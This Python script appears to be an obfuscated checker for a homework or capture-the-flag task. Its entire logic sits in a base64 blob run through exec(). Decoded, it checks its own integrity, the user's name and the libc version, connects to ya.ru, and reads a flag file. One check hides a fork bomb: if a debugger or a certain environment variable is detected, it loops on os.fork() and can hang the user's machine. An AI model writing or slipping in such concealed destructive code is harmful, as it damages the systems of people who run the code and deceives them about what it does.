#!/usr/bin/env python3

import sys
import os
import re
import getpass
import subprocess
import socket
import hashlib
import uuid
import base64

MD5 = 'e9694894f815e382dc6ba13721927217'

exec(base64.b64decode('ZGVmIGNoZWNrMCgpOgogICAgd2l0aCBvcGVuKHN5cy5hcmd2WzBdLCAncicpIGFzIGZpOgogICAgICAgIGRhdGEgPSBmaS5yZWFkbGluZXMoKVsxNDpdCgogICAgICAgIHRleHQgPSAnJy5qb2luKGRhdGEpCgogICAgICAgIGggPSBoYXNobGliLm1kNSgpCiAgICAgICAgaC51cGRhdGUodGV4dC5lbmNvZGUoKSkKCiAgICAgICAgaWYgbm90IGguaGV4ZGlnZXN0KCkgPT0gTUQ1OgogICAgICAgICAgICBwcmludCgnWW91IGNhbm5vdCBtb2RpZnkgdGhlIGZpbGUnKQogICAgICAgICAgICBzeXMuZXhpdCgtNikKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludCgnQ2hlY2sgMCBwYXNzZWQnKQoKCmRlZiBjaGVjazEobmFtZSk6CiAgICBpZiBuYW1lIGFuZCBsZW4obmFtZSkgPiA0OgogICAgICAgIG5hbWUgPSBuYW1lLnN0cmlwKCkudXBwZXIoKQogICAgZWxzZToKICAgICAgICBwcmludCgnSW5jb3JyZWN0IG5hbWUnKQogICAgICAgIHN5cy5leGl0KC0xKQogICAgcHJpbnQoJ0NoZWNrIDEgcGFzc2VkJykKCgpkZWYgY2hlY2syKG5hbWUpOgogICAgaWYgbm90IChuYW1lIGluIG9zLnBhdGguYWJzcGF0aChzeXMuYXJndlswXSkudXBwZXIoKSk6CiAgICAgICAgcHJpbnQoJ0luY29ycmVjdCBuYW1lJykKICAgICAgICBzeXMuZXhpdCgtMikKICAgIHByaW50KCdDaGVjayAyIHBhc3NlZCcpCgoKZGVmIGNoZWNrdmVyKHB0aCk6CiAgICBjaGsgPSBzdWJwcm9jZXNzLmNoZWNrX291dHB1dChbc3lzLmV4ZWN1dGFibGUsIHB0aF0sIGVuY29kaW5nPSdVVEYtOCcpCgogICAgdiA9IHJlLmZpbmRhbGwoJ1xkXC5cZFxkJywgY2hrLnNwbGl0KCdcbicpWzBdLnN0cmlwKCkpWzBdCiAgICByZXR1cm4gdiA9PSAnMi4yNCcKCgpkZWYgY2hlY2szKCk6CiAgICBnZXR0cmFjZSA9IGdldGF0dHIoc3lzLCAnZ2V0dHJhY2UnLCBOb25lKQogICAgaWYgZ2V0dHJhY2UgYW5kIGdldHRyYWNlKCkgb3Igb3MuZ2V0ZW52KCdBVVNFUicsICcnKToKICAgICAgICBwcmludCgnQ2hlYXRlcicpCiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgb3MuZm9yaygpCiAgICBwcmludCgnQ2hlY2sgMyBwYXNzZWQnKQoKCmRlZiBjaGVjazQoKToKICAgIHAgPSBzeXMuZXhlY3V0YWJsZQoKICAgIGNoayA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KFtwLCAnbGRkLnB5J10sIGVuY29kaW5nPSdVVEYtOCcpCgogICAgZm9yIHBsaW5lIGluIGNoay5zcGxpdCgnXG4nKToKICAgICAgICBpZiAnbGliYy5zby42JyBpbiBwbGluZToKICAgICAgICAgICAgbGluZSA9IHBsaW5lLnN0cmlwKCkuc3BsaXQoJyAnKVsyXQoKICAgICAgICAgICAgaWYgbm90IGNoZWNrdmVyKGxpbmUpOgogICAgICAgICAgICAgICAgcHJpbnQoJ0luY29ycmVjdCBzeXN0ZW0gdmVyc2lvbicpCiAgICAgICAgICAgICAgICBzeXMuZXhpdCgtNCkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHByaW50KCdDaGVjayA0IHBhc3NlZCcpCiAgICAgICAgICAgICAgICByZXR1cm4KCiAgICBwcmludCgnSW5jb3JyZWN0IHN5c3RlbSB2ZXJzaW9uJykKICAgIHN5cy5leGl0KC00KQoKCmRlZiBjaGVjazUoKToKICAgIHRyeToKICAgICAgICBzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQoMSkKICAgICAgICBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pLmNvbm5lY3QoKCd5YS5ydScsIDgwKSkKICAgICAgICBwcmludCgnQ2hlY2sgNSBwYXNzZWQnKQoKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBleDoKICAgICAgICBwcmludCgnSW5jb3JyZWN0IGluZXQgc2V0dGluZ3MnKQogICAgICAgIHN5cy5leGl0KC01KQoKCmRlZiBjaGVjazYobmFtZSk6CiAgICBpbXBvcnQgaHdfbW9kdWxlCgogICAgaWYgaHdfbW9kdWxlLmRvX3dvcmsoKSA+IDA6CiAgICAgICAgd2l0aCBvcGVuKCdmbGFnLnR4dCcsICdyJykgYXMgZmk6CiAgICAgICAgICAgIGRhdGEgPSBmaS5yZWFkKCkuc3RyaXAoJ1x4MDAnKQoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgdXVpZF9vYmogPSB1dWlkLlVVSUQoZGF0YSwgdmVyc2lvbj00KQoKICAgICAgICAgICAgICAgIHByaW50KGYnWW91IHBhc3NlZCBjaGVjazYgOiB7bmFtZX0te2RhdGF9JykKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICAgICAgICAgIHJhaXNlCiAgICAgICAgICAgICAgICBwYXNzCgogICAgcHJpbnQoJ1lvdSBkaWRuXCd0IGNvbXBsZXRlIDYgdGFzaycpCiAgICBzeXMuZXhpdCgtNikKCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgY2hlY2swKCkKICAgIF9uYW1lID0gaW5wdXQoJ0VudGVyIHlvdXIgbmFtZTpcbj4gJykudXBwZXIoKQogICAgY2hlY2sxKF9uYW1lKQogICAgY2hlY2syKF9uYW1lKQogICAgY2hlY2szKCkKICAgIGNoZWNrNCgpCiAgICBjaGVjazUoKQogICAgY2hlY2s2KF9uYW1lKQo='))
